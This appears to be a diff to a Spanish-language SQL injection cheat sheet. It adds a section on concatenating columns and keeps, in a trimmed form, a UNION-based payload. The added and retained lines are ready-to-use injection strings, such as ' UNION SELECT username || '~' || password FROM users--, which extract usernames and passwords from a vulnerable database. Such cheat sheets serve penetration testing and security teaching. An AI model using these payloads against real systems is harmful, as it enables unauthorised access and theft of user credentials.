@@ -64,8 +64,10 @@ SELECT [columns] FROM all_tab_columns WHERE table_name = 'USERS'
 
 #### MOSTRAR INFORMACION DE OTRAS TABLAS 
 
-' UNION SELECT username, password FROM users-- | *retrieve the username and password from table "users"*
+' UNION SELECT username, password FROM users--
 
+#### MOSTRAR MULTIPLES VALORES EN UNA MISMA COLUMNA [CONCATENACION]
 
+' UNION SELECT username || '~' || password FROM users-- 
 
 
